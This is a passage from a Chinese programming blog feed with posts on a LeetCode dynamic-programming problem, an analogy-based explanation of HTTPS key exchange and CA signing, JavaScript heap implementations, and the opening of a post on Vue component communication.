      <content type="html"><![CDATA[<h3 id="1-动态规划-Dynamic-Program"><a href="#1-动态规划-Dynamic-Program" class="headerlink" title="1. 动态规划 Dynamic Program"></a>1. 动态规划 Dynamic Program</h3><ol><li>dp公式: dp[i] = max(nums[i], nums[i] + dp[i-1])</li><li>最大子序和 = 当前元素自身最大，或者 包含之前元素后最大<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    <span class="comment">// nums[i] 代表 dp[i]</span></span><br><span class="line">    nums[i] = <span class="built_in">Math</span>.max(nums[i], nums[i] + nums[i<span class="number">-1</span>])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(...nums)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>简述一下HTTPS</title>
      <link href="/2021/08/23/HTTPS/"/>
      <url>/2021/08/23/HTTPS/</url>
      <content type="html"><![CDATA[<p>闪客和小宇要通过传字条的方式交流，怎样保证纸条传递到位，信息不被篡改，偷看？</p><p><img src="/2021/08/23/HTTPS/2.jpg" style="width: 500px"><br><br></p><h3 id="1-单钥匙锁-对称加解锁"><a href="#1-单钥匙锁-对称加解锁" class="headerlink" title="1. 单钥匙锁 - 对称加解锁"></a>1. 单钥匙锁 - 对称加解锁</h3><p>给盒子配一个锁和钥匙，解锁需要钥匙，上锁也需要钥匙。<br>由于中间的同学没有钥匙，就无法偷窥里面的内容了，也无法篡改里面的内容。<br>但是好景不长，由于钥匙也是通过同学传递过去的，同学偷偷复制了一把钥匙，然后拿着钥匙，偷看内容，修改内容，放回盒子，再把盒子锁起来。</p><p><img src="/2021/08/23/HTTPS/1.gif" style="width: 100px"><br><br></p><h3 id="2-双钥匙锁-非对称加解锁-防篡改"><a href="#2-双钥匙锁-非对称加解锁-防篡改" class="headerlink" title="2. 双钥匙锁 - 非对称加解锁 - 防篡改"></a>2. 双钥匙锁 - 非对称加解锁 - 防篡改</h3><p>给盒子配一个锁和两把不同的钥匙 A 和 B，用钥匙 A 加锁，必须用钥匙 B 才能解锁。反过来用钥匙 B 加锁，必须用钥匙 A 才能解锁。<br>我每次传字条的时候，先用钥匙A加密，然后到了小宇那里，他用钥匙B解密，就可以看到内容了。<br>坏人只能用钥匙 B 打开盒子偷看我的内容，但是他如果想篡改内容，必须用钥匙 A 才能把盒子锁住，而钥匙 A 一直在我手里，从来没有传递过，没人知道。<br>当然，坏人也可以用钥匙 B 把盒子锁住，但用 B 锁住的盒子，只能用 A 去解锁，所以如果小宇用自己手里的 B 解锁时，发现解不开，就知道内容被人篡改了。</p><p><em>内容篡改的问题解决了，但是内容被偷看的问题还没解决！</em></p><p><img src="/2021/08/23/HTTPS/2.gif" style="width: 300px"></p><p><br></p><h3 id="3-单双钥匙锁相互配合"><a href="#3-单双钥匙锁相互配合" class="headerlink" title="3. 单双钥匙锁相互配合"></a>3. 单双钥匙锁相互配合</h3><p><em>我们可以用双钥匙锁的安全性（防篡改），把单钥匙锁的钥匙安全地传送给对方，然后之后再用单钥匙锁，高效率地通信。</em></p><ol><li>由小宇设计一个双钥匙锁，配两把钥匙 C 和 D，然后把钥匙 D 给我。</li><li>我这边准备一个单钥匙锁，配一个钥匙 M，把它放在盒子里，用小宇给我的钥匙 D 加锁，传给小宇。</li><li>传送过程中，由于钥匙 D 加锁的盒子只能用钥匙 C 解锁，所以中间人无法查看和篡改内容，最终钥匙 M 被安全传送到小宇那边。</li><li>此时，我们双方都有了钥匙 M 和与之对应的单钥匙锁，而且这个钥匙 M 谁都不知道。</li><li>在此之后，我们用钥匙 M 去加密我们的信息，对方用钥匙 M 解密我们的信息，达成了安全通信的条件。</li></ol><p><img src="/2021/08/23/HTTPS/3.jpg" style="width: 500px"></p><p><em>但是好景不长，中间人还是找到了破解方法</em></p><ol><li>由小宇设计一个双钥匙锁，配两把钥匙 C 和 D，然后把钥匙 D 给我。</li><li>中间人没把钥匙 D 给我，而是把自己造的钥匙 Y 给了我，但我以为这是小宇给我的呢。</li><li>我这边准备一个单钥匙锁，配一个钥匙 M，把它放在盒子里，用小宇给我的钥匙（其实是坏蛋给我的钥匙 Y）加锁，传给小宇。</li><li>中间人收到加锁后的盒子，用自己的钥匙 X 轻松解了锁，因为这个锁是被 Y 锁的嘛~解锁后取出里面的钥匙 M，复制了一份，然后再用小宇的钥匙 D 加锁。</li><li>小宇用 C 解开了锁，得到里面的钥匙 M，这个的确是我给的，但小宇不知道此时已经被坏人知道了，与此同时我也不知道这个事。</li><li>于是我们用钥匙 M 加锁解锁通信，坏蛋也同样用钥匙 M 来偷窥或篡改我们的信息。</li></ol><p><img src="/2021/08/23/HTTPS/4.jpg" style="width: 500px"></p><p><br></p><h3 id="4-班长公证"><a href="#4-班长公证" class="headerlink" title="4. 班长公证"></a>4. 班长公证</h3><p><em>无论如何，我们第一次传输的那把钥匙，是无法进行加密的，会被中间人看到的，这是无法避免的。当时我们能不能做到，让对方可以看到，但是却无法篡改？</em></p><p>于是有了班长。</p><ol><li><p>班长准备了一个双钥匙锁，然后配置了两把钥匙 J 和 K，然后把钥匙 K 公开让所所有人都知道。</p></li><li><p>小宇在第一次准备给我钥匙 D 时，不再直接给我了，而是找班长，把钥匙 D 放在一个盒子里，让班长用自己的钥匙 J 给加锁。</p></li><li><p>然后小宇把这个用钥匙 J 加好锁的盒子传给我，我用班长公开的钥匙 K 解锁盒子，就可以得到小宇的钥匙 D 了。</p></li></ol><p><img src="/2021/08/23/HTTPS/5.jpg" style="width: 500px"></p><p>中间人可以用公开的钥匙 K 把盒子打开，看到小宇给我准备的钥匙 D。<br>但是他们却无法伪造钥匙 Y 传给我，因为要加锁这个盒子，必须要有钥匙 J，而钥匙 J 只有班长知道。中间人只能看到，不能修改了。</p><p>如果不能修改，我就能成功用小宇给我的真正的钥匙 D 加锁我们之后要通讯用的钥匙 M，于是这个钥匙 M 就被安全地传给了小宇，我们之后就可以用这个谁也不知道的钥匙 M，和配套的单钥匙锁，愉快地聊天了！</p><p><em>有钥匙的盒子只能由班长上锁，中间人无法篡改有钥匙的盒子。</em></p><p><br></p><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h3><h4 id="5-1-对称加密"><a href="#5-1-对称加密" class="headerlink" title="5.1 对称加密"></a>5.1 对称加密</h4><p>单钥匙就是对称加密。对称加密的速度很快，可以用于传输过程中的数据加密，防止中间人查看和篡改信息。但是如何将对称加密的秘钥安全传递过去是个问题。</p><h4 id="5-2-非对称加密"><a href="#5-2-非对称加密" class="headerlink" title="5.2 非对称加密"></a>5.2 非对称加密</h4><p>双钥匙就是非对称加密，用于防止内容被篡改。</p><h4 id="5-3-加密"><a href="#5-3-加密" class="headerlink" title="5.3 加密"></a>5.3 加密</h4><p>公钥加密，私钥解密，这个叫加密</p><h4 id="5-4-签名"><a href="#5-4-签名" class="headerlink" title="5.4 签名"></a>5.4 签名</h4><p>私钥加密，公钥解密，这个叫签名。<br>刚刚的过程中，首先小宇让班长用私钥 J 加密自己的公钥 D，传给我，这是私钥加密公钥解密，这个目的就是签名，防止公钥 D 在传输过程中被别人篡改。</p><h4 id="5-5-HTTPS解决了什么问题？"><a href="#5-5-HTTPS解决了什么问题？" class="headerlink" title="5.5 HTTPS解决了什么问题？"></a>5.5 HTTPS解决了什么问题？</h4><p>由于 HTTP 天生明文传输的特性，在 HTTP 的传输过程中，任何人都有可能从中截获、修改或者伪造请求发送，所以可以认为 HTTP 是不安全的。</p><h4 id="5-6-简述一下HTTPS"><a href="#5-6-简述一下HTTPS" class="headerlink" title="5.6 简述一下HTTPS"></a>5.6 简述一下HTTPS</h4><p>对称加密和非对称加密搭配使用，使用CA机构对非对称加密钥匙签名，用非对称机密传输对称加密的钥匙。成功后，用对称加密钥匙传输数据。</p><ul><li>服务器通过CA机构传递双钥匙 D，保证钥匙 D 在传输过程中无法被篡改。<br>CA机构先对钥匙D做签名（用私钥加密），发送给客户端，中间人虽然可以解密，看到钥匙 D，但是没办法上锁（因为私钥只在CA机构上有）</li><li>客户端拿到双钥匙 D，用CA机构的公钥解密</li><li>客户端拿双钥匙 D，给单钥匙 M 加密，传给服务器</li><li>服务器用双钥匙 D 解密，拿到单钥匙 M </li><li>然后服务器和客户端就可以用单钥匙来进行交流</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://mp.weixin.qq.com/s/M6y37BeiPHM0cy-fl6S8mg" target="_blank" rel="noopener">码农翻身 - 用 HTTPS 传纸条</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>堆</title>
      <link href="/2021/08/22/Leetcode-%E5%A0%86/"/>
      <url>/2021/08/22/Leetcode-%E5%A0%86/</url>
      <content type="html"><![CDATA[<blockquote><p>假设我们有10 亿个搜索关键词，如何能快速获取到Top 10的关键词呢?<br>如何实现定时器SetTimeout? 按照任务设定的执行时间，如何快速地拿到最先执行的任务？<br>借助于堆(Heap)这种数据结构，快速获取数据流中最大值，最小值。</p></blockquote><p><br></p><h3 id="1-堆-Heap"><a href="#1-堆-Heap" class="headerlink" title="1. 堆(Heap)"></a>1. 堆(Heap)</h3><p>堆是一种特殊的树。只要满足这两点，它就是一个堆</p><ul><li>堆是一个完全二叉树。<br>完全二叉树要求，除了最后一层，其他层的节点个数都是满的，最后一层的节点都靠左排列。</li><li>堆中每个节点的值都必须大于等于(或小于等于)其子树中每个节点的值<br>对于每个节点的值都大于等于子树中每个节点值的堆，我们叫做<strong>大顶堆</strong><br>对于每个节点的值都小于等于子树中每个节点值的堆，我们叫做<strong>小顶堆</strong></li></ul><p>大顶堆和小顶堆，就是我们想要的数据结构。它总是保持着堆顶元素是最大/最小的。这里假设我们已经实现了<em>大顶堆</em>和<em>小顶堆</em>，它允许初始化一个数组，对数组中的元素进行堆排序。向堆中插入新元素，获取堆顶元素的时间复杂度只要 O(nlogn)，并且还是原地排序算法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现堆的代码在下面</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (nums) &#123;&#125; <span class="comment">// 接受一个数组，一开始对nums进行堆排序</span></span><br><span class="line">  insert (num) &#123;&#125; <span class="comment">// 往堆里插入元素</span></span><br><span class="line">  removeMax () &#123;&#125; <span class="comment">// 获取堆顶元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>堆的初始化，插入元素，获取堆顶元素的方法都有了。Leetcode题就是简单地对数组进行堆排序，然后取值了。</p><p><br></p><h3 id="2-相关LeetCode题目"><a href="#2-相关LeetCode题目" class="headerlink" title="2. 相关LeetCode题目"></a>2. 相关LeetCode题目</h3><p>包括查找数组中的最大K个数，最小K个数。</p><ul><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/215.%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0.md" target="_blank" rel="noopener">215.数组中的第K个最大元素</a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/692.%E5%89%8DK%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0.md" target="_blank" rel="noopener">347.前K个高频元素</a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/692.%E5%89%8DK%E4%B8%AA%E9%AB%98%E9%A2%91%E5%8D%95%E8%AF%8D.md" target="_blank" rel="noopener">692.前K个高频单词</a> </li><li><a href="https://github.com/ufresh2013/-algorithm015/blob/master/Heap/Offer40.%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0.md" target="_blank" rel="noopener">Offer40.最小的K个数</a> </li></ul><p><br></p><h4 id="Offer40-最小的K个数"><a href="#Offer40-最小的K个数" class="headerlink" title="Offer40.最小的K个数"></a><strong>Offer40.最小的K个数</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (nums) &#123;&#125; <span class="comment">// 接受一个数组，一开始对nums进行堆排序</span></span><br><span class="line">  insert (num) &#123;&#125; <span class="comment">// 往堆里插入元素</span></span><br><span class="line">  removeMin () &#123;&#125; <span class="comment">// 获取堆顶元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getLeastNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">arr, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> heap = <span class="keyword">new</span> MinHeap(arr)</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    result.push(heap.removeMin())</span><br><span class="line">    k--</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，<code>MinHeap</code>最小堆怎么实现呢？由于JS没有堆这种基础数据，我们要自己手动实现堆。</p><p><br></p><h3 id="3-JS如何实现堆"><a href="#3-JS如何实现堆" class="headerlink" title="3. JS如何实现堆"></a>3. JS如何实现堆</h3><h4 id="3-1-如何表示一个堆"><a href="#3-1-如何表示一个堆" class="headerlink" title="3.1 如何表示一个堆"></a>3.1 如何表示一个堆</h4><p>完全二叉树适合用数组来存储。我们不需要存储左右子节点的指针，单纯通过数组的下标，就可以找到一个节点的左右子节点和父节点。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">7</span></span><br><span class="line">  /   \</span><br><span class="line">  <span class="number">5</span>     <span class="number">6</span></span><br><span class="line">/ \   /  \</span><br><span class="line"><span class="number">4</span>  <span class="number">2</span>  <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用数组存储堆的例子</span></span><br><span class="line"><span class="comment">// 下标为i的节点, 其左子节点的下标是 i * 2，其右子节点的下标是 i * 2 + 1, 其父节点下标为 Math.floor(i / 2)</span></span><br><span class="line">[<span class="literal">undefined</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-实现大顶堆"><a href="#3-2-实现大顶堆" class="headerlink" title="3.2 实现大顶堆"></a>3.2 实现大顶堆</h4><p>保证堆顶元素最大<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">- 往堆中插入一个元素</span></span><br><span class="line"><span class="comment">【 从下往上的堆化方法 】插入后使其重新满足堆的特性，这个过程，叫做堆化(heapify)。把节点放在最后，如果不满足子节点小于等于父节点的大小关系，就互换两个节点，一直重复这个过程，直到满足这种大小关系。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- 删除堆顶元素</span></span><br><span class="line"><span class="comment">任何节点的值都大于等于（或小于等于）子树节点的值，我们可以发现，堆顶元素就是堆中数据的最大值或最小值。</span></span><br><span class="line"><span class="comment">【 从上往下的堆化方法 】我们把最后一个节点放到堆顶，然后利用同样的父子节点对比方法。对于不满足父子节点关系的，互换两个节点，并重复进行这个过程。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> swap = <span class="function">(<span class="params">arr, idx1, idx2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[idx1]</span><br><span class="line">  arr[idx1] = arr[idx2]</span><br><span class="line">  arr[idx2] = temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (arr) &#123;</span><br><span class="line">    <span class="keyword">this</span>.arr = [] <span class="comment">// 从下标1开始存储数据</span></span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span> <span class="comment">// 堆已经存储的数据个数</span></span><br><span class="line">    arr.forEach(<span class="function"><span class="params">v</span> =&gt;</span> <span class="keyword">this</span>.insert(v))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  insert (data) &#123;</span><br><span class="line">    <span class="keyword">this</span>.count++</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count] = data</span><br><span class="line">    <span class="keyword">let</span> i = <span class="keyword">this</span>.count</span><br><span class="line">    <span class="comment">// 把节点放在最后，对比当前节点与父节点的关系，如果不满足，则互换节点</span></span><br><span class="line">    <span class="keyword">while</span> ((i / <span class="number">2</span> | <span class="number">0</span>) &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.arr[i] &gt; <span class="keyword">this</span>.arr[(i / <span class="number">2</span> | <span class="number">0</span>)]) &#123; <span class="comment">// 自下往上堆化</span></span><br><span class="line">      swap(<span class="keyword">this</span>.arr, i, (i / <span class="number">2</span> | <span class="number">0</span>))</span><br><span class="line">      i = i / <span class="number">2</span> | <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeMax () &#123;</span><br><span class="line">    <span class="keyword">const</span> heapify = <span class="function">(<span class="params">arr, n, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 自上往下堆化</span></span><br><span class="line">        <span class="keyword">let</span> maxPos = i</span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span> &lt;= n &amp;&amp; arr[i] &lt; arr[i*<span class="number">2</span>]) maxPos = i*<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span>+<span class="number">1</span> &lt;= n &amp;&amp; arr[maxPos] &lt; arr[i*<span class="number">2</span>+<span class="number">1</span>]) maxPos = i*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (maxPos == i) <span class="keyword">break</span></span><br><span class="line">        swap(arr, i, maxPos)</span><br><span class="line">        i = maxPos</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.count === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span> <span class="comment">// 堆中没有数据</span></span><br><span class="line">    <span class="keyword">const</span> max = <span class="keyword">this</span>.arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="number">1</span>] = <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count]</span><br><span class="line">    <span class="keyword">this</span>.count--</span><br><span class="line">    heapify(<span class="keyword">this</span>.arr, <span class="keyword">this</span>.count, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-实现小顶堆"><a href="#3-3-实现小顶堆" class="headerlink" title="3.3 实现小顶堆"></a>3.3 实现小顶堆</h4><p>保证堆顶元素最小<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> swap = <span class="function">(<span class="params">arr, idx1, idx2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[idx1]</span><br><span class="line">  arr[idx1] = arr[idx2]</span><br><span class="line">  arr[idx2] = temp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinHeap</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (arr) &#123;</span><br><span class="line">    <span class="keyword">this</span>.arr = [] <span class="comment">// 从下标1开始存储数据</span></span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span> <span class="comment">// 堆已经存储的数据个数</span></span><br><span class="line">    arr.forEach(<span class="function"><span class="params">v</span> =&gt;</span> <span class="keyword">this</span>.insert(v)) <span class="comment">// 建堆</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  insert (data) &#123;</span><br><span class="line">    <span class="keyword">this</span>.count++</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count] = data</span><br><span class="line">    <span class="keyword">let</span> i = <span class="keyword">this</span>.count</span><br><span class="line">    <span class="comment">// 把节点放在最后，对比当前节点与父节点的关系，如果不满足，则互换节点</span></span><br><span class="line">    <span class="keyword">while</span> (i/<span class="number">2</span>|<span class="number">0</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.arr[i] &lt; <span class="keyword">this</span>.arr[i/<span class="number">2</span>|<span class="number">0</span>]) &#123;</span><br><span class="line">      swap(<span class="keyword">this</span>.arr, i, (i / <span class="number">2</span> | <span class="number">0</span>))</span><br><span class="line">      i = i / <span class="number">2</span> | <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  removeMin () &#123;</span><br><span class="line">    <span class="keyword">const</span> heapify = <span class="function">(<span class="params">arr, n, i</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 自上往下堆化</span></span><br><span class="line">        <span class="keyword">let</span> maxPos = i</span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span> &lt;= n &amp;&amp; arr[i] &gt; arr[i*<span class="number">2</span>]) maxPos = i*<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (i*<span class="number">2</span>+<span class="number">1</span> &lt;= n &amp;&amp; arr[maxPos] &gt; arr[i*<span class="number">2</span>+<span class="number">1</span>]) maxPos = i*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (maxPos == i) <span class="keyword">break</span></span><br><span class="line">        swap(arr, i, maxPos)</span><br><span class="line">        i = maxPos</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.count === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span> <span class="comment">// 堆中没有数据</span></span><br><span class="line">    <span class="keyword">const</span> min = <span class="keyword">this</span>.arr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">this</span>.arr[<span class="number">1</span>] = <span class="keyword">this</span>.arr[<span class="keyword">this</span>.count]</span><br><span class="line">    <span class="keyword">this</span>.count--</span><br><span class="line">    heapify(<span class="keyword">this</span>.arr, <span class="keyword">this</span>.count, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> min</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>组件通信的多种方式</title>
      <link href="/2021/08/21/vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
      <url>/2021/08/21/vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</url>
      <content type="html"><![CDATA[<blockquote><p>组件通信方式都有哪些？哪种比较好？</p></blockquote><h3 id="1-各种通信方式的优劣势"><a href="#1-各种通信方式的优劣势" class="headerlink" title="1. 各种通信方式的优劣势"></a>1. 各种通信方式的优劣势</h3><ul><li><p><em><code>props</code></em><br>父组件向子组件传值，不适合多层级关系，多层级传值写法冗余</p></li><li><p><em><code>$on, $emit</code></em><br>子组件向父组件通信</p></li><li><p><em><code>v-model: props + $emit</code></em><br>props 和 $emit结合，就是v-model双向绑定</p></li><li><p><em><code>prarent/children/ref</code></em><br>父组件调用子组件方法，兄弟组件通信</p></li><li><p><em><code>provide/inject</code></em><br>适用于一个数据有多个子组件在同时使用，如提交一个复杂表单<br>（ 要注意，<code>provide</code>和<code>inject</code>绑定并不是可响应的，你必须<code>watch</code>来实现响应 ）</p></li><li><p><em><code>eventBus/$on/$emit</code></em><br>用得少，层级深入复杂，且组件之间没有啥关系。要让他们通信，如果是是在小项目中，EventBus就是个不错的选择。</p></li><li><p><em><code>$attrs/$listeners</code></em><br>对层级不深的组件关系，怎么传值？attrs跟listeners是一个不错的选择。他的中间组件，可以不受影响，去传递给子孙组件。</p></li><li><p><em><code>vuex</code></em><br>关于全局缓存变量的储存，在传统时代，根据cookies,localstorage,session等，基本可以完成变量的存储。但是在数据驱动的时代，所有的数据需要双向绑定才能完成数据驱动，但是明显cookies，localstorage，session等，无法完成双向绑定。这时就要用到 vuex，redux等，提供<em>全局状态管理</em>，<em>持久化处理</em>。</p></li></ul><p><br></p><h3 id="1-props"><a href="#1-props" class="headerlink" title="1. props"></a>1. props</h3><p>父组件向子组件传送数据<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;child :value=<span class="string">"value"</span> /&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-on-emit"><a href="#2-on-emit" class="headerlink" title="2. $on, $emit"></a>2. $on, $emit</h3><p>子组件向父组件通信。子组件通过派发事件，给父组件发消息<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;child @sendMsg=<span class="string">"getChildMsg"</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.$emit(<span class="string">"sendMsg"</span>,<span class="keyword">this</span>.msg)</span><br></pre></td></tr></table></figure></p><h3 id="3-v-model-sync"><a href="#3-v-model-sync" class="headerlink" title="3. v-model, .sync"></a>3. v-model, .sync</h3><p>双向绑定<code>v-model</code>是props + $emit的结合。<br>子组件不能直接修改<code>props</code>，子组件需要通过<code>$emit</code>发送事件的方式让父组件修改<code>props</code>。<br>v-model<code>会解析成名为</code>value<code>的</code>prop<code>和名为</code>@input`的事件。其根本，还是通过事件的方式让父组件修改数据。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 